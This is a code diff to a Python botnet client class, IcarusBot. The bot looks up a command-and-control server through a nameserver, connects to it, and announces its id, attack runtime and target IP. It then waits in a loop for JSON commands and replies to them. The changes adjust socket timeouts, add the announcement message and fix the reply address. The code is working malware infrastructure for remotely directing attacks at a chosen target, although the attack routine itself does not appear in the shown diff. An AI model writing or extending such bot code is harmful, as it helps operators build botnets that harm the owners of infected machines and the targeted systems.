@@ -47,6 +47,8 @@ class IcarusBot:
         # This will constantly run and update with the nameserver.
         threading.Thread(target=self.update_with_nameserver, daemon=True).start()
         # Now we go and look for the C2 server.
+        self.sock.settimeout(30)
+
         while True:
             nameserver_available = False
             # This will loop until the nameserver has an answer.
@@ -58,7 +60,6 @@ class IcarusBot:
                     nameserver_available = True
                 time.sleep(5)
             # Now that we've got the C2 server IP, let's go ahead and setup the socket for connecting.
-            self.sock.settimeout(30)
             self.sock.connect((self.c2_server_details[0], int(self.c2_server_details[1])))
             self.main_loop()
             # This means that the C2 server has been inactive, so we restart the process of searching for the next C2 server.
@@ -92,13 +93,24 @@ class IcarusBot:
                 2.1 disconnect with the webserver and ignore it.
                 2.2 Go back to asking the nameserver for a IP address for a C2 server.
         """
-        parser = json.JSONDecoder()
-        encoder = json.JSONEncoder()
         self.status = BotAction.IDLE
+
+        # Now we notify the bot of our existence
+        init_message = {
+            'status': self.status,
+            'id': self.bot_id,
+            'runtime': self.attack_runtime,
+            'target': self.target_ip
+        }
+        init_message = json.dumps(init_message)
+        self.sock.sendto(str.encode(init_message), (self.c2_server_details[0], int(self.c2_server_details[1])))
+
+        # Now we just listen for message requests.
         while True:
             try:
                 # We now interact with this like any other object.
                 jsonMsg = json.loads(self.sock.recv(4096).decode('ascii'))
+                print(jsonMsg)
                 request_type = jsonMsg['request']
                 response = ''
                 # Through each if statement, we specify what we're going to do. The logic is contained in each if.
@@ -112,11 +124,11 @@ class IcarusBot:
                     }
                     response = json.dumps(response)
                 # This will then send the message back to the server, irrespective of the flag.
-                self.sock.sendto(str.encode(response), self.c2_server_details)
+                self.sock.sendto(str.encode(response), (self.c2_server_details[0], int(self.c2_server_details[1])))
             except timeout or Exception:
                 # the server has lagged out
                 print("timeout")
-                return
+                break
 
     #
     # def lookup(self):
